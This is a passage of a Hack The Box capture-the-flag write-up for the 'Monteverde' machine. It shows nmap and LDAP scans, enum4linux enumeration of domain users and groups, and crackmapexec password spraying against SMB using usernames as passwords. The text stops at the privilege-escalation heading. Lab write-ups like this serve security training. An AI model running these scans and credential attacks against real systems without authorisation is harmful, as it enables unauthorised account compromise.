# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.172 -T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/1.png
">

After running a thorough portscan on the target we learn that the target is a domain controller and has lot's of open ports. This can be usefull for enumeration.

# Enumeration
We'll try to run some basic vulnerability scans on ports that are known to have security issues. This didn't return anything usefull.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/2.png
">

Running ```enum4linux 10.10.10.172``` gave use much information:
```
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```
We note that the ```Account Lockout Threshold``` is set to ```None``` enabling us to bruteforce the target without being locked out.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/4.png
">

Unfortunately there isn't a share available. This is a common place to find usefull information. But we do have found some usernames which we'll save to ```username.txt```.
```
mhope
dgalanos
roleary
smorgan
SABatchJobs
```

Also running the following command returned a lot of information related to the domain.
```
map -n -sV --script "ldap* and not brute" 10.10.10.172 -Pn
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/3.png
">

Running ```ldapdomaindump 10.10.10.172``` gave me issues. Not sure if it's a local problem.

# Initial Foothold
We can now try to run a dictionary attack on the smb service using ```crackmapexec```.

```
crackmapexec smb 10.10.10.172 -d megabank -u usernames.txt -p /usr/share/seclists/Passwords/darkweb2017-top1000.txt 
```
That didn't return valid credentials. Let's try it again using the usernames also as passwords:
```
crackmapexec smb 10.10.10.172 -d megabank -u usernames.txt -p usernames.txt
```
That led to success:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/5.png
">

# Privilege Escalation